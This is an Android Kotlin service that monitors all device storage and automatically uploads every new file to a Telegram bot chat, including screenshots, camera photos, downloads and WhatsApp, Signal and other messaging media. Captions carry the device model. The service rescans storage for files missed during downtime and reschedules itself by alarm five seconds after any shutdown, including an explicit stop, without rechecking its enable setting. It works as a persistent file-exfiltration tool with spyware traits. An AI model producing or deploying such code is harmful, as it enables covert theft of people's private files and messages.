package com.ismartcoding.plain.telegram

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.FileObserver
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.provider.MediaStore
import com.ismartcoding.lib.logcat.LogCat
import com.ismartcoding.plain.preferences.TelegramBotEnabledPreference
import com.ismartcoding.plain.preferences.TelegramBotTokenPreference
import com.ismartcoding.plain.preferences.TelegramChatIdPreference
import com.ismartcoding.plain.preferences.TelegramFileForwardEnabledPreference
import com.ismartcoding.plain.workers.FileForwardScanWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class FileForwardService : Service() {

    companion object {
        private const val TAG = "FileForwardSvc"
        private const val NOTIF_CHANNEL = "file_forward_ch"
        private const val NOTIF_ID = 9432
        private const val MAX_OBSERVERS = 500

        @Volatile private var _instance: FileForwardService? = null

        fun isRunning(): Boolean = _instance != null

        fun startIfEnabled(ctx: Context) {
            val enabled = runBlocking {
                TelegramBotEnabledPreference.getAsync(ctx) &&
                    TelegramFileForwardEnabledPreference.getAsync(ctx)
            }
            if (!enabled) return
            if (isRunning()) return
            try {
                val i = Intent(ctx, FileForwardService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ctx.startForegroundService(i)
                } else {
                    ctx.startService(i)
                }
            } catch (e: Exception) {
                LogCat.e("$TAG startIfEnabled failed: ${e.message}")
            }
        }

        fun stopService(ctx: Context) {
            _instance?._running = false
            ctx.stopService(Intent(ctx, FileForwardService::class.java))
        }

        fun tagForPath(path: String?): String {
            if (path == null) return "File"
            val low = path.lowercase(Locale.ROOT)
            if (low.contains("screenshot")) return "Screenshot"
            if (low.contains("screenrecord") || low.contains("screen_record")) return "ScreenRecord"
            if (low.contains("/camera") || low.contains("/dcim")) return "Camera"
            if (low.contains("whatsapp")) return "WhatsApp"
            if (low.contains("telegram")) return "Telegram"
            if (low.contains("instagram")) return "Instagram"
            if (low.contains("facebook") || low.contains("/orca")) return "Facebook"
            if (low.contains("messenger")) return "Messenger"
            if (low.contains("signal")) return "Signal"
            if (low.contains("twitter") || low.contains("twimg")) return "Twitter"
            if (low.contains("snapchat")) return "Snapchat"
            if (low.contains("/download")) return "Download"
            if (low.contains("/documents") || low.contains("/document")) return "Documents"
            if (low.contains("/bluetooth")) return "Bluetooth"
            if (low.contains("shareit") || low.contains("xender") || low.contains("superbeam")) return "File Share"
            if (low.contains("/movies") || low.contains("/video")) return "Video"
            if (low.contains("/music") || low.contains("/audio") ||
                low.contains("/podcast") || low.contains("/audiobook")
            ) return "Audio"
            if (low.contains("/pictures") || low.contains("/photo")) return "Photo"
            if (low.contains("chrome") || low.contains("firefox") || low.contains("opera") ||
                low.contains("brave") || low.contains("edge")
            ) return "Browser Download"
            return "File"
        }

        fun scanAllDirs(ctx: Context) {
            val q = FileForwardQueue.get(ctx)
            val hasFullAccess = Build.VERSION.SDK_INT < Build.VERSION_CODES.R ||
                Environment.isExternalStorageManager()
            val extDir = Environment.getExternalStorageDirectory()
            if (extDir != null && extDir.exists()) {
                scanDir(q, extDir, hasFullAccess, 0)
            }
            try {
                ctx.getExternalFilesDirs(null).forEach { d ->
                    if (d == null) return@forEach
                    var root: File = d
                    repeat(4) { if (root.parentFile != null) root = root.parentFile!! }
                    if (root != extDir) scanDir(q, root, hasFullAccess, 0)
                }
            } catch (ignored: Exception) {}
            _instance?.wakeConsumer()
        }

        private fun scanDir(q: FileForwardQueue, dir: File, fullAccess: Boolean, depth: Int) {
            if (!dir.exists() || !dir.isDirectory) return
            if (dir.name.startsWith(".")) return
            if (dir.name == "Android" && depth == 1 && !fullAccess) {
                val media = File(dir, "media")
                if (media.exists()) scanDir(q, media, false, depth + 1)
                return
            }
            val entries = dir.listFiles() ?: return
            for (f in entries) {
                if (f.name.startsWith(".")) continue
                if (f.isFile) q.enqueue(f.absolutePath, tagForPath(f.absolutePath))
                else if (f.isDirectory) scanDir(q, f, fullAccess, depth + 1)
            }
        }

        fun recoverMissedFiles(ctx: Context) {
            val lastAlive = FileForwardQueue.getLastAliveTime(ctx)
            if (lastAlive == 0L) {
                FileForwardQueue.recordAliveTime(ctx)
                scanAllDirs(ctx)
                return
            }
            val gapMs = System.currentTimeMillis() - lastAlive
            if (gapMs < 45_000L) {
                FileForwardQueue.recordAliveTime(ctx)
                return
            }
            LogCat.w("$TAG Recovery: offline ${gapMs / 1000}s — scanning missed files")
            val scanSince = lastAlive - 3 * 60 * 1000L
            val fullAccess = Build.VERSION.SDK_INT < Build.VERSION_CODES.R ||
                Environment.isExternalStorageManager()
            val q = FileForwardQueue.get(ctx)
            var found = 0
            val extDir = Environment.getExternalStorageDirectory()
            if (extDir != null && extDir.exists()) {
                found += scanSince(q, extDir, scanSince, fullAccess, 0)
            }
            try {
                ctx.getExternalFilesDirs(null).forEach { d ->
                    if (d == null) return@forEach
                    var root: File = d
                    repeat(4) { if (root.parentFile != null) root = root.parentFile!! }
                    if (root != extDir) found += scanSince(q, root, scanSince, fullAccess, 0)
                }
            } catch (ignored: Exception) {}
            LogCat.i("$TAG Recovery complete: $found files found during ${gapMs / 1000}s gap")
            FileForwardQueue.recordRecovery(ctx, lastAlive, gapMs, found)
            FileForwardQueue.recordAliveTime(ctx)
            _instance?.wakeConsumer()
            if (gapMs > 60_000L) sendRecoveryAlert(ctx, gapMs, found)
        }

        private fun scanSince(
            q: FileForwardQueue,
            dir: File,
            since: Long,
            fullAccess: Boolean,
            depth: Int,
        ): Int {
            if (!dir.exists() || !dir.isDirectory) return 0
            if (dir.name.startsWith(".")) return 0
            if (dir.name == "Android" && depth == 1 && !fullAccess) {
                val media = File(dir, "media")
                return if (media.exists()) scanSince(q, media, since, false, depth + 1) else 0
            }
            val entries = dir.listFiles() ?: return 0
            var count = 0
            for (f in entries) {
                if (f.name.startsWith(".")) continue
                if (f.isFile) {
                    if (f.lastModified() >= since &&
                        q.enqueue(f.absolutePath, tagForPath(f.absolutePath))
                    ) count++
                } else if (f.isDirectory) {
                    count += scanSince(q, f, since, fullAccess, depth + 1)
                }
            }
            return count
        }

        private fun sendRecoveryAlert(ctx: Context, gapMs: Long, filesFound: Int) {
            Thread({
                try {
                    val token = runBlocking { TelegramBotTokenPreference.getAsync(ctx) }
                    val chatId = runBlocking { TelegramChatIdPreference.getAsync(ctx) }
                    if (token.isBlank() || chatId.isBlank()) return@Thread
                    val gapSec = gapMs / 1000
                    val h = gapSec / 3600; val m = (gapSec % 3600) / 60; val s = gapSec % 60
                    val gapStr = if (h > 0) "${h}h ${"${m}".padStart(2, '0')}m" else "${m}m ${"${s}".padStart(2, '0')}s"
                    val msg = "⚡ <b>File Auto-Forward Recovery</b>\n" +
                        "━━━━━━━━━━━━━━━━━━━━━━\n" +
                        "⏱ App was offline for: <b>$gapStr</b>\n" +
                        "📁 Files found during gap: <b>$filesFound</b>\n" +
                        (if (filesFound > 0) "⬆️ Queued for upload — sending now…\n" else "✅ No new files arrived during downtime.\n") +
                        "🛡 All systems back online."
                    TelegramApiClient.sendMessage(token, chatId, msg)
                } catch (e: Exception) {
                    LogCat.e("$TAG recoveryAlert: ${e.message}")
                }
            }, "FFwd-RecoveryAlert").start()
        }
    }

    @Volatile var _running = false
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var _obsThread: HandlerThread
    private val _mediaObs = mutableListOf<ContentObserver>()
    private val _fileObs = mutableListOf<FileObserver>()
    private val _uploadLock = Object()

    @Volatile private var _token = ""
    @Volatile private var _chatId = ""

    override fun onCreate() {
        super.onCreate()
        _instance = this
        _obsThread = HandlerThread("FFwd-Observer")
        _obsThread.start()
        createNotifChannel()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try { startForeground(NOTIF_ID, buildNotif()) } catch (e: Exception) {
            LogCat.w("$TAG startForeground: ${e.message}")
        }
        scope.launch {
            _token = TelegramBotTokenPreference.getAsync(applicationContext)
            _chatId = TelegramChatIdPreference.getAsync(applicationContext)
        }
        FileForwardQueue.get(this).resetStuck()
        if (!_running) {
            _running = true
            scope.launch(Dispatchers.IO) { recoverMissedFiles(applicationContext) }
            registerObservers()
            startConsumer()
            FileForwardScanWorker.enqueue(this)
        }
        FileForwardQueue.recordAliveTime(this)
        return START_STICKY
    }

    override fun onDestroy() {
        _running = false
        _instance = null
        unregisterObservers()
        if (::_obsThread.isInitialized) _obsThread.quitSafely()
        scope.cancel()
        scheduleRestart()
        super.onDestroy()
    }

    private fun scheduleRestart() {
        val am = getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
        val i = Intent(this, FileForwardService::class.java)
        val f = PendingIntent.FLAG_UPDATE_CURRENT or
            (if (Build.VERSION.SDK_INT >= 23) PendingIntent.FLAG_IMMUTABLE else 0)
        val pi = PendingIntent.getService(this, 9879, i, f)
        val t = System.currentTimeMillis() + 5_000L
        if (Build.VERSION.SDK_INT >= 23) {
            try { am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, t, pi) }
            catch (e: SecurityException) { am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, t, pi) }
        } else {
            am.setExact(AlarmManager.RTC_WAKEUP, t, pi)
        }
    }

    private fun registerObservers() {
        val cr = contentResolver
        val handler = Handler(_obsThread.looper)
        registerMediaObs(cr, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, handler)
        registerMediaObs(cr, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, handler)
        registerMediaObs(cr, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, handler)
        registerMediaObs(cr, MediaStore.Files.getContentUri("external"), handler)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            registerMediaObs(cr, MediaStore.Downloads.EXTERNAL_CONTENT_URI, handler)
        }
        val extDir = Environment.getExternalStorageDirectory()
        if (extDir != null) walkAndWatch(extDir, 0, handler)
        try {
            getExternalFilesDirs(null).forEach { d ->
                if (d == null) return@forEach
                var root: File = d
                repeat(3) { if (root.parentFile != null) root = root.parentFile!! }
                if (root.exists() && root != extDir) walkAndWatch(root, 0, handler)
            }
        } catch (ignored: Exception) {}
    }

    private fun registerMediaObs(cr: ContentResolver, uri: Uri, handler: Handler) {
        val obs = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, changedUri: Uri?) {
                handler.post { handleMediaChange(uri) }
            }
        }
        cr.registerContentObserver(uri, true, obs)
        _mediaObs.add(obs)
    }

    private fun walkAndWatch(dir: File, depth: Int, handler: Handler) {
        if (!dir.exists() || !dir.isDirectory) return
        if (_fileObs.size >= MAX_OBSERVERS) return
        if (dir.name.startsWith(".")) return
        val hasFullAccess = Build.VERSION.SDK_INT < Build.VERSION_CODES.R ||
            Environment.isExternalStorageManager()
        if (dir.name == "Android" && depth == 0 && !hasFullAccess) {
            val media = File(dir, "media")
            if (media.exists()) walkAndWatch(media, depth + 1, handler)
            return
        }
        watchDir(dir, tagForPath(dir.absolutePath), handler)
        if (depth >= 6) return
        val children = dir.listFiles() ?: return
        for (child in children) {
            if (child.isDirectory) walkAndWatch(child, depth + 1, handler)
        }
    }

    @Suppress("DEPRECATION")
    private fun watchDir(dir: File, tag: String, handler: Handler) {
        val mask = FileObserver.CLOSE_WRITE or FileObserver.MOVED_TO
        val fo: FileObserver = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            object : FileObserver(dir, mask) {
                override fun onEvent(event: Int, name: String?) {
                    if (name != null && !name.startsWith(".")) {
                        val f = File(dir, name)
                        handler.postDelayed({ handleNewFile(f.absolutePath, tag) }, 2500)
                    }
                }
            }
        } else {
            val p = dir.absolutePath
            object : FileObserver(p, mask) {
                override fun onEvent(event: Int, name: String?) {
                    if (name != null && !name.startsWith(".")) {
                        handler.postDelayed({ handleNewFile("$p/$name", tag) }, 2500)
                    }
                }
            }
        }
        fo.startWatching()
        _fileObs.add(fo)
    }

    private fun unregisterObservers() {
        try { contentResolver.apply { _mediaObs.forEach { unregisterContentObserver(it) } } } catch (_: Exception) {}
        _mediaObs.clear()
        _fileObs.forEach { try { it.stopWatching() } catch (_: Exception) {} }
        _fileObs.clear()
    }

    private fun handleMediaChange(baseUri: Uri) {
        try {
            val proj = arrayOf(
                MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.DATE_ADDED,
                MediaStore.MediaColumns.DISPLAY_NAME,
            )
            val nowSec = System.currentTimeMillis() / 1000
            contentResolver.query(
                baseUri, proj,
                "${MediaStore.MediaColumns.DATE_ADDED} > ?",
                arrayOf((nowSec - 30).toString()),
                "${MediaStore.MediaColumns.DATE_ADDED} DESC",
            )?.use { c ->
                while (c.moveToNext()) {
                    val data = c.getString(0) ?: continue
                    handleNewFile(data, tagForPath(data))
                }
            }
        } catch (e: Exception) {
            LogCat.w("$TAG handleMediaChange: ${e.message}")
        }
    }

    private fun handleNewFile(path: String, tag: String) {
        val f = File(path)
        if (!f.exists() || !f.isFile) return
        if (System.currentTimeMillis() - f.lastModified() < 1000) {
            Handler(_obsThread.looper).postDelayed({ handleNewFile(path, tag) }, 2000)
            return
        }
        val queued = FileForwardQueue.get(this).enqueue(path, tag)
        if (queued) {
            LogCat.d("$TAG Queued [$tag]: ${f.name}")
            updateNotif()
            wakeConsumer()
        }
    }

    fun wakeConsumer() {
        synchronized(_uploadLock) { _uploadLock.notifyAll() }
    }

    private fun startConsumer() {
        scope.launch(Dispatchers.IO) {
            var lastHeartbeat = System.currentTimeMillis()
            while (_running && isActive) {
                try {
                    val q = FileForwardQueue.get(applicationContext)
                    val entry = q.nextPending()
                    if (entry == null) {
                        synchronized(_uploadLock) { _uploadLock.wait(30_000) }
                    } else {
                        if (_token.isBlank()) _token = TelegramBotTokenPreference.getAsync(applicationContext)
                        if (_chatId.isBlank()) _chatId = TelegramChatIdPreference.getAsync(applicationContext)
                        val ok = uploadToTelegram(entry)
                        if (ok) {
                            q.markDone(entry.id)
                            LogCat.d("$TAG Uploaded: ${entry.path}")
                            updateNotif()
                        } else {
                            q.markFailed(entry.id)
                            LogCat.w("$TAG Failed attempt ${entry.retries + 1}: ${entry.path}")
                            delay(5_000)
                        }
                    }
                    val now = System.currentTimeMillis()
                    if (now - lastHeartbeat >= 30_000L) {
                        FileForwardQueue.recordAliveTime(applicationContext)
                        lastHeartbeat = now
                    }
                } catch (e: InterruptedException) {
                    break
                } catch (e: Exception) {
                    LogCat.w("$TAG consumer: ${e.message}")
                    delay(5_000)
                }
            }
        }
    }

    private fun uploadToTelegram(entry: FileForwardQueue.Entry): Boolean {
        val token = _token
        val chatId = _chatId
        if (token.isBlank() || chatId.isBlank()) return false
        val f = File(entry.path)
        if (!f.exists()) return true
        if (f.length() > FileForwardQueue.MAX_UPLOAD_BYTES) {
            val msg = "⚠️ <b>Large File — Not Uploaded</b>\n" +
                "📁 [${entry.tag}] ${htmlEsc(f.name)}\n" +
                "📏 Size: ${FileForwardQueue.formatSize(f.length())} (exceeds 49 MB)\n" +
                "📂 ${htmlEsc(truncatePath(f.absolutePath, 90))}"
            return TelegramApiClient.sendMessage(token, chatId, msg)
        }
        val caption = buildCaption(entry, f)
        val mime = entry.mime
        return when {
            mime.startsWith("image/") && f.length() < 10L * 1024 * 1024 ->
                TelegramApiClient.sendPhoto(token, chatId, f, caption)
            mime.startsWith("video/") ->
                TelegramApiClient.sendVideo(token, chatId, f, caption)
            mime.startsWith("audio/") ->
                TelegramApiClient.sendAudio(token, chatId, f, caption, durationSec = 0)
            else -> TelegramApiClient.sendDocument(token, chatId, f, caption)
        }
    }

    private fun buildCaption(entry: FileForwardQueue.Entry, f: File): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        val detected = sdf.format(Date(entry.detectedAt))
        val modified = sdf.format(Date(f.lastModified()))
        val device = "${Build.MANUFACTURER} ${Build.MODEL} · Android ${Build.VERSION.RELEASE}"
        var caption = "📁 <b>[${entry.tag}]</b> ${htmlEsc(f.name)}\n" +
            "━━━━━━━━━━━━━━━━━━━━\n" +
            "📏 ${FileForwardQueue.formatSize(f.length())}  🗂 ${entry.mime}\n" +
            "📅 Detected: $detected\n" +
            "🔧 Modified: $modified\n" +
            "📂 ${htmlEsc(truncatePath(f.absolutePath, 80))}\n" +
            "📱 ${htmlEsc(device)}"
        if (caption.length > 1020) caption = caption.substring(0, 1020) + "…"
        return caption
    }

    private fun htmlEsc(s: String): String =
        s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    private fun truncatePath(path: String, maxLen: Int): String {
        if (path.length <= maxLen) return path
        return "…${path.substring(path.length - maxLen + 1)}"
    }

    private fun createNotifChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(NOTIF_CHANNEL, "File Auto-Forward", NotificationManager.IMPORTANCE_LOW)
            ch.description = "Auto-forwards new files from all storage to Telegram"
            ch.setShowBadge(false)
            (getSystemService(NotificationManager::class.java))?.createNotificationChannel(ch)
        }
    }

    private fun buildNotif(): Notification {
        val pending = try { FileForwardQueue.get(this).countPending() } catch (_: Exception) { 0L }
        val sub = if (pending > 0) "$pending files pending · uploading…" else "Monitoring all folders · all file types"
        val piFlags = PendingIntent.FLAG_UPDATE_CURRENT or
            (if (Build.VERSION.SDK_INT >= 23) PendingIntent.FLAG_IMMUTABLE else 0)
        val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
        val pi = if (launchIntent != null) PendingIntent.getActivity(this, 2, launchIntent, piFlags) else null
        val b = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, NOTIF_CHANNEL)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this).setPriority(Notification.PRIORITY_LOW)
        }
        b.setContentTitle("📁 File Auto-Forward Active")
            .setContentText(sub)
            .setSmallIcon(android.R.drawable.ic_menu_save)
            .setOngoing(true)
        if (pi != null) b.setContentIntent(pi)
        return b.build()
    }

    private fun updateNotif() {
        try {
            (getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager)
                ?.notify(NOTIF_ID, buildNotif())
        } catch (_: Exception) {}
    }
}
